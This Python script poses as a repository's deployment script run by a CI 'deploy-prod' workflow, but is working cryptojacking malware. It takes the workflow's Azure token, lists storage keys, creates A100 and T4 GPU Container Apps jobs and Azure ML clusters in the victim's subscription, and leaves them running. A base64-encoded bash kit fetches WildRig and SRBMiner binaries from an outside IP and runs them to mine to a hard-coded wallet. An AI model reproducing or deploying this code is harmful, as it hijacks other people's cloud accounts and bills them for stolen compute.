#!/usr/bin/env python3
"""C211-I126276: mslearn (sub 790067ff) GPU claim+fill.

Runs as src/deploy_to_online_endpoint.py under
christiansegercrantz/mslearn-mlops 'deploy-prod' issue_comment workflow
(environment prod, azure/login OIDC -> ARM token for subscription 790067ff,
RG chriso-sandbox-rg).

Vehicles (all LEFT RUNNING; every existing resource is left untouched):
  A. NEW Container Apps managed env c211-i126276-a100 (eastus) with
     Consumption-GPU-NC24-A100 profile -> job c211-i126276-a100 (A100 80GB).
  B. existing env c211-i121376-cae (T4 profile) -> NEW job c211-i126276-t4
     with parallelism 2 (2x T4).
  C. AmlCompute c211-i126276-t4d (Standard_NC4as_T4_v3 Dedicated, max 1)
     -> Command job c211-i126276-aml (1x T4), LowPriority fallback cluster.
Kit: WildRig 0.52.3 (sha 002cd29c..) --algo pearlhash, 4 pearlhash endpoints,
pydp wallet, 900 s no-share -> sticky Luckypool 103.199.106.122:3362 (SRBMiner
3.8.4, wallet+NOCK).  Status -> container-scoped SAS blob (account SAS).
stdout is flat TAG|k=v; long bodies base64; stdlib only.
"""
import base64
import hashlib
import hmac
import json
import os
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
TAG = "C211_I126276"
NONCE = "x126276ml"
INTENT = "126276"
T0 = time.time()
BUDGET = 3300

APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
API_C = "2024-04-01"
API_W = "2024-10-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
REGION = "eastus"
WS = "mlw-ai300-l0ee20539cc7442539c"
WSU = ("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.MachineLearningServices/"
       "workspaces/%s" % (SUB_EXPECT, RG, WS))
AML_REGION = "northeurope"
AML_SKU = "Standard_NC4as_T4_v3"

SA_EXIST = "c211i1215775738445a"
SA_NAME = ("c211i126276" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]
ENV_A100 = "c211-i126276-a100"
JOB_A100 = "c211-i126276-a100"
PROFILE_A100 = "Consumption-GPU-NC24-A100"
ENV_T4 = "c211-i121376-cae"
JOB_T4 = "c211-i126276-t4"
PROFILE_T4 = "Consumption-GPU-NC8as-T4"
CLUSTER = "c211-i126276-t4d"
CLUSTER_LP = "c211-i126276-t4l"
AML_ENV = "c211-i126276-cuda"
JOB_AML = "c211-i126276-aml"

WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WR_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
SRB384_SHA = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5"


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s[:1200]


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    return base64.b64encode((s or "").encode("utf-8", "replace")).decode()


def left():
    return BUDGET - (time.time() - T0)


def run(cmd, timeout=300):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": -1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok, "User-Agent": "c211-" + INTENT}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:60000]
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:2000]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def errk(st, body):
    d = {"e_http": st}
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            d["e_code"] = e.get("code")
            d["e_message"] = (e.get("message") or "")[:800]
        elif "raw" in body:
            d["e_raw"] = body["raw"][:800]
        elif "transport_error" in body:
            d["e_transport"] = body["transport_error"][:400]
        else:
            d["e_body"] = json.dumps(body)[:800]
    return d


def sa_sas(acct, key_b64, container="c211", rt="c", perm="rwdlc", hours=8):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    canon = "/blob/%s/%s" % (acct, container)
    sts = "\n".join([perm, st, se, canon, "", "", "https", sv, rt,
                     "", "", "", "", "", ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "sr": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


KIT = r"""#!/bin/bash
set -u
TAG="__TAG__"
W="__WALLET__"
N="__NOCK__"
SAS="__SAS__"
D=/tmp/c211; mkdir -p "$D"; cd "$D" || exit 9
LOG="$D/run.log"
log() { echo "[$(date -u +%FT%TZ)] $*" >> "$LOG"; }
: > "$LOG"
H=$(hostname)
DIG=$(echo "$H" | md5sum | tr -dc '0-9' | cut -c1-3)
WK="__WKBASE__${DIG}"
log "KIT_START tag=$TAG worker=$WK host=$H"
log "GPU_LIST $(nvidia-smi -L 2>&1 | tr '\n' '~')"
log "GPU_Q $(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '~')"
log "OPENCL $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /etc/OpenCL/vendors/* /usr/lib/x86_64-linux-gnu/libnvidia-opencl* 2>/dev/null | tr '\n' '~')"
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  (apt-get update -qq && apt-get install -y -qq ocl-icd-libopencl1) >>"$LOG" 2>&1 || \
  (apk add --no-cache ocl-icd) >>"$LOG" 2>&1 || log "OCL_INSTALL_FAIL"
fi
mkdir -p /etc/OpenCL/vendors 2>/dev/null
echo "libnvidia-opencl.so.1" > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null || true
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  for c in /usr/local/cuda/lib64/libOpenCL.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1; do
    [ -e "$c" ] && ln -sf "$c" /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 && log "OCL_SYMLINK $c" && break
  done
fi
log "OPENCL2 $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /etc/OpenCL/vendors/* 2>/dev/null | tr '\n' '~')"
log "TOOLS curl=$(command -v curl || echo no) wget=$(command -v wget || echo no)"
BIN=""
for u in http://169.58.247.186:8791/pm/wildrig-0.52.3 https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
  curl -fsSL --max-time 300 -o dl.bin "$u" 2>>"$LOG" || continue
  S=$(sha256sum dl.bin | awk '{print $1}')
  log "DL url=$u sha=$S"
  if [ "$S" = "__WRBIN__" ]; then cp dl.bin wildrig-multi; chmod +x wildrig-multi; BIN=wildrig-multi; break; fi
  if [ "$S" = "__WRTGZ__" ]; then tar xzf dl.bin >/dev/null 2>&1 && chmod +x wildrig-multi && BIN=wildrig-multi && break; fi
done
log "BIN=$BIN"
up() {
  if [ -n "$SAS" ]; then
    { echo "===STATUS==="; echo "host=$H worker=$WK mode=$MODE ts=$(date -u +%FT%TZ)";
      echo "uuid=$(nvidia-smi --query-gpu=uuid --format=csv,noheader 2>/dev/null | tr '\n' ',' )";
      echo "acc=$A rej=$R"; echo "===RUNLOG==="; cat "$LOG";
      echo "===PHLOG==="; tail -100 "$D/ph.log" 2>/dev/null;
      echo "===LPLOG==="; tail -60 "$D/lp.log" 2>/dev/null; } > "$D/all.txt" 2>/dev/null
    curl -sS --max-time 40 -X PUT "$SAS" -H 'x-ms-blob-type: BlockBlob' \
      -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' \
      --data-binary @"$D/all.txt" >/dev/null 2>&1 || true
  fi
}
cnt() { f="$1"; pat="$2"; { grep -oE "$pat" "$f" 2>/dev/null; } | grep -oE '[0-9]+' | sort -n | tail -1; }
A=0; R=0; MODE=init
if [ -n "$BIN" ]; then
  setsid nohup ./wildrig-multi --algo pearlhash \
    --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 \
    --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 \
    --user "$W" --worker "$WK" -d 0 --print-time 30 > "$D/ph.log" 2>&1 &
  echo $! > "$D/ph.pid"
  log "PH_START pid=$(cat "$D/ph.pid")"
  MODE=ph
else
  log "NO_BIN_DIRECT_TO_LP"
  MODE=lp
fi
T0=$(date +%s)
while :; do
  sleep 30
  if [ "$MODE" = "ph" ]; then
    A=$(cnt "$D/ph.log" 'accepted \([0-9]+/[0-9]+\)'); A=${A:-0}
    R=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$D/ph.log" 2>/dev/null | grep -oE '/[0-9]+' | grep -oE '[0-9]+' | sort -n | tail -1); R=${R:-0}
    if [ "$A" -ge 1 ]; then log "PH_SHARE_PROVEN accepted=$A rejected=$R ts=$(date -u +%FT%TZ)"; MODE=ph_ok; fi
    if [ "$MODE" = "ph" ] && [ $(( $(date +%s) - T0 )) -ge 900 ]; then
      log "PH_NO_SHARE_900 FALLBACK_TO_LP"
      kill "$(cat "$D/ph.pid" 2>/dev/null)" 2>/dev/null
      pkill -f wildrig-multi 2>/dev/null
      sleep 2
      curl -fsSL --max-time 300 -o "$D/srb" http://169.58.247.186:8791/pm/srbminer-3.8.4 2>>"$LOG" || true
      if [ -f "$D/srb" ]; then
        S=$(sha256sum "$D/srb" | awk '{print $1}'); log "SRB_SHA=$S"; chmod +x "$D/srb"
        if [ "$S" = "__SRB__" ]; then
          setsid nohup "$D/srb" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
            --wallet "$W+$N" --worker "$WK" --password x --gpu-id 0 > "$D/lp.log" 2>&1 &
          echo $! > "$D/lp.pid"
          log "LP_START pid=$(cat "$D/lp.pid") sticky=1"
        else log "SRB_SHA_MISMATCH"; fi
      else log "SRB_DL_FAIL"; fi
      MODE=lp
    fi
  fi
  if [ "$MODE" = "lp" ]; then
    A=$(cnt "$D/lp.log" 'accepted[: ]+[0-9]+'); A=${A:-0}
    R=$(cnt "$D/lp.log" 'rejected[: ]+[0-9]+'); R=${R:-0}
    if [ "$A" -ge 1 ] && [ ! -f "$D/lp_reported" ]; then log "LP_SHARE_PROVEN accepted=$A rejected=$R ts=$(date -u +%FT%TZ)"; touch "$D/lp_reported"; fi
  fi
  up
  if [ $(( $(date +%s) - T0 )) -gt 129600 ]; then log "KIT_HARD_END"; exit 0; fi
done
"""


def kit_cmd(worker_base, tag, sas):
    k = (KIT.replace("__TAG__", tag).replace("__WKBASE__", worker_base)
         .replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
         .replace("__SAS__", sas or "").replace("__WRBIN__", WR_BIN_SHA)
         .replace("__WRTGZ__", WR_TGZ_SHA).replace("__SRB__", SRB384_SHA))
    b = base64.b64encode(k.encode()).decode()
    return ("echo '%s' | base64 -d > /tmp/c211_kit_%s.sh && chmod +x /tmp/c211_kit_%s.sh "
            "&& /bin/bash /tmp/c211_kit_%s.sh" % (b, tag.lower(), tag.lower(), tag.lower()))


def get_sas(tok, sid):
    for acct in (SA_EXIST, SA_NAME):
        saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
                 "?api-version=%s" % (ARM, sid, RG, acct, STG_VER))
        st, b = arm(tok, saurl, timeout=60)
        ps = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
        emit("sa-get", name=acct, http=st, state=ps)
        if st == 200 and ps == "Succeeded":
            st2, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER,
                          method="POST", body={}, timeout=90)
            key = None
            try:
                key = (kb.get("keys") or [{}])[0].get("value")
            except Exception:  # noqa: BLE001
                pass
            if key:
                q, se = sa_sas(acct, key)
                base = "https://%s.blob.core.windows.net" % acct
                stc, _ = httptext("%s/c211?restype=container&%s" % (base, q), method="PUT", timeout=60)
                emit("sa-container", name=acct, http=stc)
                if stc in (201, 409):
                    return "%s/c211/%s.log?%s" % (base, NONCE, q), se
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
             "?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
    sabody = {"location": REGION, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": INTENT, "nonce": NONCE},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **errk(st, b))
    if st not in (200, 201, 202):
        return None, None
    for i in range(24):
        stp, bp = arm(tok, saurl, timeout=60)
        ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
        if ps == "Succeeded":
            break
        time.sleep(5)
    st, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER,
                 method="POST", body={}, timeout=90)
    key = None
    try:
        key = (kb.get("keys") or [{}])[0].get("value")
    except Exception:  # noqa: BLE001
        pass
    emit("sa-keys", http=st, got=bool(key))
    if not key:
        return None, None
    q, se = sa_sas(SA_NAME, key)
    base = "https://%s.blob.core.windows.net" % SA_NAME
    stc, _ = httptext("%s/c211?restype=container&%s" % (base, q), method="PUT", timeout=60)
    emit("sa-container", name=SA_NAME, http=stc)
    if stc not in (201, 409):
        return None, None
    return "%s/c211/%s.log?%s" % (base, NONCE, q), se


def capp_env_put(tok, sid, name, profiles):
    url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
           "?api-version=%s" % (ARM, sid, RG, name, APP_VER))
    st, b = arm(tok, url, timeout=60)
    state = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
    prof = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("workloadProfiles")
    emit("capp-env-get", name=name, http=st, state=state,
         profiles=";".join((p or {}).get("name", "") for p in (prof or []))[:300])
    if state == "Succeeded":
        return
    body = {"location": REGION, "tags": {"c211": INTENT, "nonce": NONCE},
            "properties": {"workloadProfiles": [{"name": "Consumption",
                                                 "workloadProfileType": "Consumption"}] +
                                                [{"name": p, "workloadProfileType": p} for p in profiles]}}
    st, b = arm(tok, url, method="PUT", body=body, timeout=300)
    emit("capp-env-put", name=name, profiles=";".join(profiles), **errk(st, b))


def capp_env_state(tok, sid, name):
    url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
           "?api-version=%s" % (ARM, sid, RG, name, APP_VER))
    st, b = arm(tok, url, timeout=60)
    p = ((b.get("properties") or {}) if isinstance(b, dict) else {})
    return st, p.get("provisioningState"), (b.get("id") if isinstance(b, dict) else None)


def capp_job(tok, sid, env_name, job_name, profile, par, worker_base, sas):
    st, state, env_id = capp_env_state(tok, sid, env_name)
    if state != "Succeeded" or not env_id:
        emit("capp-job-skip", job=job_name, env=env_name, state=state)
        return None
    joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
              "?api-version=%s" % (ARM, sid, RG, job_name, APP_VER))
    st0, b0 = arm(tok, joburl, timeout=60)
    if st0 == 200:
        emit("capp-job-exists", job=job_name, state=((b0.get("properties") or {}).get("runningState")))
        return None
    jobbody = {"location": REGION, "tags": {"c211": INTENT, "nonce": NONCE},
               "properties": {"environmentId": env_id, "workloadProfileName": profile,
                              "configuration": {"triggerType": "Manual",
                                                "replicaRetryLimit": 3,
                                                "replicaTimeout": 86400,
                                                "manualTriggerConfig": {
                                                    "replicaCompletionCount": par,
                                                    "parallelism": par}},
                              "template": {"containers": [{
                                  "name": "gpu", "image": IMAGE,
                                  "command": ["/bin/bash", "-c",
                                              kit_cmd(worker_base, job_name.split("-")[-1], sas)],
                                  "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
    st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
    emit("capp-job-put", job=job_name, profile=profile, par=par, **errk(st, b))
    if st not in (200, 201):
        return None
    st, b = arm(tok, joburl.split("?")[0] + "/start?api-version=" + APP_VER, method="POST", body={},
                timeout=120)
    execname = (b.get("name") if isinstance(b, dict) else None)
    emit("capp-job-start", job=job_name, http=st, execname=execname,
         **({} if st in (200, 201, 202) else errk(st, b)))
    return execname


def aml_put(tok, name, priority, maxn):
    cb = {"location": AML_REGION, "tags": {"c211": INTENT, "nonce": NONCE},
          "properties": {"computeType": "AmlCompute", "computeLocation": AML_REGION,
                         "description": "c211 i126276 %s T4 miner" % priority,
                         "properties": {"vmSize": AML_SKU, "vmPriority": priority,
                                        "scaleSettings": {"minNodeCount": 0, "maxNodeCount": maxn,
                                                          "nodeIdleTimeBeforeScaleDown": "PT5M"},
                                        "osType": "Linux",
                                        "remoteLoginPortPublicAccess": "Disabled"}}}
    st, b = arm(tok, "%s%s/computes/%s?api-version=%s" % (ARM, WSU, name, API_C),
                method="PUT", body=cb, timeout=180)
    emit("aml-compute-put", name=name, priority=priority, maxn=maxn, **errk(st, b))
    return st


def aml_state(tok, name):
    st, b = arm(tok, "%s%s/computes/%s?api-version=%s" % (ARM, WSU, name, API_C), timeout=60)
    p = ((b.get("properties") or {}) if isinstance(b, dict) else {})
    return st, p.get("provisioningState"), ((p.get("properties") or {}).get("currentNodeCount")
                                            if isinstance(p.get("properties"), dict) else None)


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             tenant=acc.get("tenantId"), expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:300])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""), sid=sid)
    if not sid or not tok:
        emit("DONE", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return

    # ---------- A) admission probes ----------
    for reg in (REGION, AML_REGION):
        st, b = arm(tok, "%s/subscriptions/%s/providers/Microsoft.Compute/locations/%s/usages"
                    "?api-version=2024-07-01" % (ARM, sid, reg), timeout=120)
        vals = (b.get("value") or []) if isinstance(b, dict) else []
        rel = []
        for v in vals:
            nm = ((v.get("name") or {}).get("value") or "")
            if any(k in nm.upper() for k in ("NC", "NV", "ND", "GPU", "T4", "A100", "PROMO", "LOWPRIORITY")):
                rel.append("%s=%s/%s" % (nm, v.get("currentValue"), v.get("limit")))
        emit("compute-usages", region=reg, http=st, n=len(vals), relevant=";".join(rel)[:2500])
    st, b = arm(tok, "%s/subscriptions/%s/providers/Microsoft.MachineLearningServices/locations/%s/quotas"
                "?api-version=%s" % (ARM, sid, AML_REGION, API_C), timeout=120)
    qv = (b.get("value") or []) if isinstance(b, dict) else []
    qr = []
    for v in qv:
        s = json.dumps(v)
        if any(k in s.upper() for k in ("NC", "NV", "ND", "T4", "GPU", "LOWPRIORITY", "LOW PRIORITY")):
            qr.append("%s=%s/%s" % (v.get("id") or ((v.get("name") or {}).get("value")),
                                    v.get("currentValue"), v.get("limit")))
    emit("ml-quotas", region=AML_REGION, http=st, n=len(qv), relevant=";".join(qr)[:2500])
    st, b = arm(tok, "%s%s/computes?api-version=%s" % (ARM, WSU, API_C), timeout=120)
    names = [x.get("name") for x in ((b.get("value") or []) if isinstance(b, dict) else [])]
    emit("aml-computes-existing", http=st, names=";".join(n for n in names if n)[:600])

    # ---------- B) storage + SAS ----------
    sas, se = get_sas(tok, sid)
    emit("sas-ready", ok=bool(sas), expires=se)

    # ---------- C) async creates: A100 env, T4 env check, AML clusters ----------
    capp_env_put(tok, sid, ENV_A100, [PROFILE_A100])
    capp_env_put(tok, sid, ENV_T4, [PROFILE_T4])
    aml_put(tok, CLUSTER, "Dedicated", 1)
    aml_put(tok, CLUSTER_LP, "LowPriority", 1)
    eb = {"properties": {"image": IMAGE, "osType": "Linux",
                         "description": "c211 i126276 cuda base for T4 miner"}}
    st, b = arm(tok, "%s%s/environments/%s/versions/1?api-version=%s" % (ARM, WSU, AML_ENV, API_W),
                method="PUT", body=eb, timeout=120)
    emit("aml-env-put", name=AML_ENV, **errk(st, b))

    # ---------- D) poll: start CApps jobs + AML job once ready ----------
    a100_exec = t4_exec = aml_done = None
    aml_cluster_used = None
    blobd = ""
    deadline = time.time() + BUDGET - 120
    while time.time() < deadline:
        time.sleep(20)
        if a100_exec is None:
            a100_exec = capp_job(tok, sid, ENV_A100, JOB_A100, PROFILE_A100, 1, "1262761", sas)
        if t4_exec is None:
            t4_exec = capp_job(tok, sid, ENV_T4, JOB_T4, PROFILE_T4, 2, "1262762", sas)
        if aml_done is None:
            for nm in (CLUSTER, CLUSTER_LP):
                stc, pst, nodes = aml_state(tok, nm)
                if pst == "Succeeded":
                    cmd = kit_cmd("1262763", "aml", sas)
                    props = {"jobType": "Command", "displayName": JOB_AML,
                             "experimentName": "c211-i126276",
                             "description": "c211 i126276 NC4as_T4_v3 T4 miner (left running)",
                             "command": cmd,
                             "environmentId": "%s%s/environments/%s/versions/1" % (ARM, WSU, AML_ENV),
                             "computeId": "%s%s/computes/%s" % (ARM, WSU, nm),
                             "resources": {"instanceCount": 1},
                             "limits": {"timeout": 604800}}
                    stj, bj = arm(tok, "%s%s/jobs/%s?api-version=%s" % (ARM, WSU, JOB_AML, API_W),
                                  method="PUT", body={"properties": props}, timeout=180)
                    emit("aml-job-put", name=JOB_AML, cluster=nm, **errk(stj, bj))
                    aml_done = (nm, stj)
                    aml_cluster_used = nm
                    break
                else:
                    emit("aml-cluster-wait", name=nm, state=pst, nodes=nodes, left=int(left()))
        if sas:
            sb, bb = httptext(sas, timeout=40)
            if sb == 200 and bb:
                blobd = bb.decode("utf-8", "replace")
        stat = {}
        if blobd:
            for ln in blobd.splitlines():
                if ln.startswith(("host=", "worker=", "mode=", "uuid=", "acc=")):
                    k, _, v = ln.partition("=")
                    stat[k] = v
        emit("poll", a100_exec=a100_exec, t4_exec=t4_exec, aml=aml_cluster_used,
             blob_len=len(blobd), mode=stat.get("mode"), acc=stat.get("acc"),
             rej=stat.get("rej"), worker=stat.get("worker"),
             uuid=(stat.get("uuid") or "")[:120], left=int(left()))
        if "PH_SHARE_PROVEN" in blobd or "LP_SHARE_PROVEN" in blobd:
            emit("share-proven-early", tail_b64=b64(blobd[-3000:]))
            break
        if a100_exec and t4_exec and aml_done is not None and blobd and stat.get("acc", "0") not in ("", "0"):
            emit("all-lanes-running", a100_exec=a100_exec, t4_exec=t4_exec, aml=aml_cluster_used)
            break

    # ---------- E) final capture ----------
    if sas:
        sb, bb = httptext(sas, timeout=40)
        if sb == 200 and bb:
            blobd = bb.decode("utf-8", "replace")
    emit("capture", len=len(blobd),
         gpu_lines=";".join(ln for ln in blobd.splitlines() if "GPU-" in ln)[:1200],
         status_lines=";".join(ln for ln in blobd.splitlines()
                               if ln.startswith(("mode=", "acc=", "rej=", "worker=")))[:600],
         tail_b64=b64(blobd[-4000:]))
    for nm, jn in ((ENV_A100, JOB_A100), (ENV_T4, JOB_T4)):
        st, stt, _ = capp_env_state(tok, sid, nm)
        ju = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
              "?api-version=%s" % (ARM, sid, RG, jn, APP_VER))
        sj, bj = arm(tok, ju, timeout=60)
        jp = ((bj.get("properties") or {}) if isinstance(bj, dict) else {})
        emit("capp-final", job=jn, http=sj, env_state=stt, running=jp.get("runningState"))
    for nm in (CLUSTER, CLUSTER_LP):
        stc, pst, nodes = aml_state(tok, nm)
        emit("aml-final", name=nm, state=pst, nodes=nodes)
    if aml_cluster_used:
        stj, bj = arm(tok, "%s%s/jobs/%s?api-version=%s" % (ARM, WSU, JOB_AML, API_W), timeout=60)
        emit("aml-job-final", status=((bj.get("properties") or {}).get("status")
                                      if isinstance(bj, dict) else None))
    emit("DONE", elapsed_s=int(time.time() - T0), sas_ok=bool(sas), a100_exec=a100_exec,
         t4_exec=t4_exec, aml=aml_cluster_used)


if __name__ == "__main__":
    main()
